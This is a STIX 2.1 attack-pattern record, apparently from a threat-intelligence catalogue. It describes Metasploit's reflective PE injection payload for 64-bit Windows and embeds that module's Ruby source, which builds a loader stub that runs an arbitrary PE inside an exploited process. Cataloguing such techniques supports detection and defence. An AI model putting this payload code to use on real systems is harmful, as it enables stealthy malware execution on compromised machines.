{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b2ccf578-b9a8-4d08-8fde-ec1319f3cf61",
    "created": "2024-08-14T16:33:19.261674Z",
    "modified": "2024-08-14T16:33:19.261678Z",
    "name": "Windows Inject Reflective PE Files",
    "description": " Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address of entry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/stages/windows/x64/peinject.rb",
            "external_id": "peinject.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/EgeBalci/Amber"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n###\n#\n# Injects an arbitrary PE file in the exploited process via reflective PE loader.\n#\n###\nmodule MetasploitModule\n  include Msf::Payload::Windows\n  include Msf::Payload::Windows::PEInject\n  include Msf::Payload::Windows::ReflectivePELoader_x64\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Inject Reflective PE Files',\n        'Description' => %q{\n          Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE\n          loader will execute the pre-mapped PE image starting from the address of entry after performing image base\n          relocation and API address resolution. This module requires a PE file that contains relocation data and a\n          valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks\n          are not currently supported. Also PE files which use resource loading might crash.\n        },\n        'Author' => [\n          'ege <egebalci[at]pm.me>'\n        ],\n        'References' => [\n          ['URL', 'https://github.com/EgeBalci/Amber']\n        ],\n        'License' => MSF_LICENSE,\n        'Platform' => 'win',\n        'Arch' => ARCH_X64,\n        'PayloadCompat' => {\n          'Convention' => 'sockrdi handlerdi -http -https'\n        },\n        'DefaultOptions' => {\n          'EXITFUNC' => 'thread'\n        }\n      )\n    )\n  end\n\n  def encapsulate_reflective_stub(mapped_pe, opts)\n    call_size = mapped_pe.length + 5\n    reflective_loader = Metasm::Shellcode.assemble(Metasm::X64.new, \"call $+#{call_size}\").encode_string\n    reflective_loader += mapped_pe\n    reflective_loader + Metasm::Shellcode.assemble(Metasm::X64.new, asm_reflective_pe_loader_x64(opts)).encode_string\n  end\nend\n",
    "x_mitre_platforms": [
        "win'"
    ]
}